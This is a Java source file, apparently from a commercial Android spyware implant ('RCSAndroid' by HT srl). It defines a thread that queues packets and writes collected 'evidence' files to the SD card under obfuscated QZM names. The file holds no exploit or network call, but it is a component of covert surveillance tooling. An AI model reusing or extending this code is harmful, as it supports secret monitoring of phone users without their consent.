/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : LogDispatcher.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI;

import java.io.File;
import java.util.HashMap;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.locks.Condition;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

import android.util.Log;

import com.ht.RCSAndroidGUI.file.Path;
import com.ht.RCSAndroidGUI.utils.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class LogDispatcher.
 */
public class LogDispatcher extends Thread implements Runnable {

	/** The singleton. */
	private volatile static LogDispatcher singleton;

	/** The q. */
	private final BlockingQueue<Packet> q;

	/** The log map. */
	private final HashMap<Long, Evidence> evidences;

	/** The halt. */
	private boolean halt;

	/** The sd dir. */
	private File sdDir;

	/** The lock. */
	final Lock lock = new ReentrantLock();

	/** The no logs. */
	final Condition noLogs = lock.newCondition();

	private final String TAG = "LogDispatcher";

	/*
	 * private BroadcastReceiver mExternalStorageReceiver; private boolean
	 * mExternalStorageAvailable = false; private boolean
	 * mExternalStorageWriteable = false;
	 */

	/**
	 * Instantiates a new log dispatcher.
	 */
	private LogDispatcher() {
		halt = false;

		q = new LinkedBlockingQueue<Packet>();
		evidences = new HashMap<Long, Evidence>();
	}

	// Log name: QZM + 1 byte + 8 bytes + 4 bytes
	// QZA -> Signature
	// 1 byte -> Priority: 1 max - 255 min
	// 8 bytes -> Timestamp
	// 4 bytes -> .tmp while writing, .log when ready
	//
	// Markup name: QZM + 4 byte + 4 byte
	// QZM -> Signature
	// 4 bytes -> Log Type
	// 4 bytes -> .mrk
	/**
	 * Process queue.
	 */
	private void processQueue() {
		Packet p;
		// Log.d("RCS", "processQueue() Packets in Queue: " + q.size());

		if (q.size() == 0) {
			return;
		}

		try {
			p = q.take();
		} catch (final InterruptedException e) {
			e.printStackTrace();
			return;
		}

		switch (p.getCommand()) {
		case LogR.LOG_CREATE:
			Log.d("RCS", "processQueue() got LOG_CREATE");
			createLog(p);
			break;

		case LogR.LOG_ATOMIC:
			Log.d("RCS", "processQueue() got LOG_ATOMIC");
			atomicLog(p);
			break;

		case LogR.LOG_APPEND:
			Log
					.e("RCS",
							"processQueue() got LOG_APPEND: DEPRECATED, use write");
			writeLog(p);
			break;

		case LogR.LOG_WRITE:
			Log.d("RCS", "processQueue() got LOG_WRITE");
			writeLog(p);
			break;

		case LogR.LOG_CLOSE:
			Log.d("RCS", "processQueue() got LOG_CLOSE");
			closeLog(p);
			break;

		case LogR.LOG_REMOVE:
			Log.e("RCS", "processQueue() got LOG_REMOVE: DEPRECATED");
			// removeLog(p);
			break;

		case LogR.LOG_REMOVEALL:
			Log.e("RCS", "processQueue() got LOG_REMOVEALL: DEPRECATED");
			// removeAll();
			break;

		case LogR.LOG_WRITEMRK:
			Log.d("RCS", "processQueue() got LOG_WRITEMRK");
			writeMarkup(p);
			break;

		default:
			Log.e("RCS", "processQueue() got LOG_UNKNOWN");
			break;
		}

		return;
	}

	/**
	 * Self.
	 * 
	 * @return the log dispatcher
	 */
	public static LogDispatcher self() {
		if (singleton == null) {
			synchronized (LogDispatcher.class) {
				if (singleton == null) {
					singleton = new LogDispatcher();
				}
			}
		}

		return singleton;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see java.lang.Thread#run()
	 */
	@Override
	public void run() {
		Log.d("RCS", "LogDispatcher started");

		// Create log directory
		sdDir = new File(Path.logs());
		sdDir.mkdirs();

		// Debug - used to remove the directory
		// sdDir();

		while (true) {
			lock.lock();

			try {
				while (q.size() == 0 && !halt) {
					noLogs.await();
				}

				// Halt command has precedence over queue processing
				if (halt == true) {
					q.clear();
					evidences.clear();
					Log.d("RCS", "LogDispatcher closing");
					return;
				}

				processQueue();
			} catch (final InterruptedException e) {
				e.printStackTrace();
			} finally {
				lock.unlock();
			}
		}
	}

	/**
	 * Send.
	 * 
	 * @param o
	 *            the o
	 * @return true, if successful
	 */
	public synchronized boolean send(final Packet packet) {
		lock.lock();
		boolean added = false;

		try {
			added = q.add(packet);

			if (added) {
				noLogs.signal();
			}
		} catch (final Exception e) {
			e.printStackTrace();
		} finally {
			lock.unlock();
		}

		return added;
	}

	/**
	 * Halt.
	 */
	public synchronized void halt() {
		lock.lock();

		try {
			halt = true;
			noLogs.signal();
		} finally {
			lock.unlock();
		}
	}

	/**
	 * Write markup.
	 * 
	 * @param p
	 *            the p
	 * @return true, if successful
	 */
	private boolean writeMarkup(final Packet p) {
		try {
			File file = null;
			final String markupName = "QZM-" + p.getType() + ".mrk";

			file = new File(sdDir, markupName);

			final boolean created = file.createNewFile();

			if (created == false) {
				return false;
			}

			// TODO: Scrivi nel file

			return true;
		} catch (final Exception e) {
			Log.d("RCS", "LogDispatcher.createLog() exception detected");
			e.printStackTrace();
			return false;
		}
	}

	/**
	 * Creates the log.
	 * 
	 * @param p
	 *            the p
	 * @return true, if successful
	 */
	private boolean createLog(final Packet p) {
		Check.ensures(!evidences.containsKey(p.getId()),
				"evidence already mapped");

		final byte[] additional = p.getAdditional();
		final Evidence evidence = new Evidence(p.getType());
		evidence.createEvidence(additional);
		evidences.put(p.getId(), evidence);

		return true;
	}

	/**
	 * Creates a simple log, copies the payload and closes it in one atomic
	 * step.
	 * 
	 * @param p
	 */
	private void atomicLog(final Packet p) {
		Check.ensures(!evidences.containsKey(p.getId()),
				"evidence already mapped");

		final byte[] additional = p.getAdditional();
		final byte[] data = p.peek();
		final Evidence evidence = new Evidence(p.getType());
		evidence.createEvidence(additional);
		evidence.writeEvidence(data);
		evidence.close();
	}

	/**
	 * Write log.
	 * 
	 * @param p
	 *            the p
	 * @return true, if successful
	 */
	private boolean writeLog(final Packet p) {
		if (evidences.containsKey(p.getId()) == false) {
			Log.d(TAG, "Requested log not found");
			return false;
		}

		final Evidence evidence = evidences.get(p.getId());
		final boolean ret = evidence.writeEvidence(p.peek());
		return ret;

	}

	/**
	 * Close log.
	 * 
	 * @param p
	 *            the p
	 * @return true, if successful
	 */
	private boolean closeLog(final Packet p) {
		if (evidences.containsKey(p.getId()) == false) {
			Log.d(TAG, "Requested log not found");
			return false;
		}

		// Rename .tmp to .log
		final Evidence evidence = evidences.get(p.getId());
		evidence.close();

		return true;
	}

	/*
	 * Inserire un Intent-receiver per gestire la rimozione della SD private
	 * void updateExternalStorageState() { String state =
	 * Environment.getExternalStorageState(); if
	 * (Environment.MEDIA_MOUNTED.equals(state)) { mExternalStorageAvailable =
	 * mExternalStorageWriteable = true; } else if
	 * (Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
	 * mExternalStorageAvailable = true; mExternalStorageWriteable = false; }
	 * else { mExternalStorageAvailable = mExternalStorageWriteable = false; }
	 * handleExternalStorageState(mExternalStorageAvailable,
	 * mExternalStorageWriteable); }
	 * 
	 * private void startWatchingExternalStorage() { mExternalStorageReceiver =
	 * new BroadcastReceiver() {
	 * 
	 * @Override public void onReceive(Context context, Intent intent) {
	 * Log.i("test", "Storage: " + intent.getData());
	 * updateExternalStorageState(); } }; IntentFilter filter = new
	 * IntentFilter(); filter.addAction(Intent.ACTION_MEDIA_MOUNTED);
	 * filter.addAction(Intent.ACTION_MEDIA_REMOVED);
	 * registerReceiver(mExternalStorageReceiver, filter);
	 * updateExternalStorageState(); }
	 * 
	 * private void stopWatchingExternalStorage() {
	 * unregisterReceiver(mExternalStorageReceiver); }
	 */
}
